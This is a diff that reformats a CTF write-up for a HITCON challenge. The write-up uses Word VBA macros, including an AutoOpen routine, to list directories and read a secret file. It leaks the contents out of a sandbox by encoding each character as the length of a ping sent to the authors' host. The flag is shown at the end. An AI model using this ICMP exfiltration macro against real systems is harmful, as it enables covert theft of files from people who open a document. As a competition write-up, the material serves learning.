@@ -20,8 +20,7 @@ First guess was, ping to home
 Shell ("ping -n 1 my.ip.add.ress")
 TCPDUMP from home with ICMP on. Bingo, we go packets We went and wrote few more connection script like email, web and DNS. Looks like we got no luck at all. So we concluded.
 
-- NO Outgoing TCP Allowed
-- NO Outgoing UDP Allowed (ppp solved it with DNS)
+- NO Outgoing TCP Allowed (** ppp solved it with DNS)
 
 Concluded only ICMP able to to go out from the box. So, we did another test. 
 
@@ -32,7 +31,7 @@ And we received
 11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10
 
 This is clear that we can somehow use the length to pass some data. So, first thing is. We want to know where are we.
-
+```
 strString = (ActiveDocument.Path)
 For i = 1 To Len(strString)
     strHex = Hex(Asc(Mid(strString, i, 1)))
@@ -41,11 +40,13 @@ For i = 1 To Len(strString)
     MsgBox (strDec)
     'Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
 Next
+```
 
 Next From the ping with length, we convert back the Dec value back to ASCII, we got PATH Secondly, we go a "dir" 
+
+```
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 objStartFolder = (ActiveDocument.Path)
-
 
 Set objFolder = objFSO.GetFolder(objStartFolder)
 'MsgBox objFolder.Path
@@ -68,10 +69,12 @@ For Each objFile In colFiles
 
     Shell ("ping -n 1 -l 34 my.ip.add.ress")
 Next
+```
 
 Nothing seems to me interesting. So we change and code a little bit and do a dir on "C:\", we found secret.txt !!! Another peace of code to show what is in secret.txt 
-Sub AutoOpen()
 
+```
+Sub AutoOpen()
 
 Dim MyString As String
 
@@ -109,6 +112,7 @@ Close #1
 
 
 End Sub
+```
 
 From TCPDUMP we received 
 
@@ -123,7 +127,7 @@ From TCPDUMP we received
 
 By taking all the length, we got the string as 
 
-hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}
+> hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}
 
 Done !!! 
 
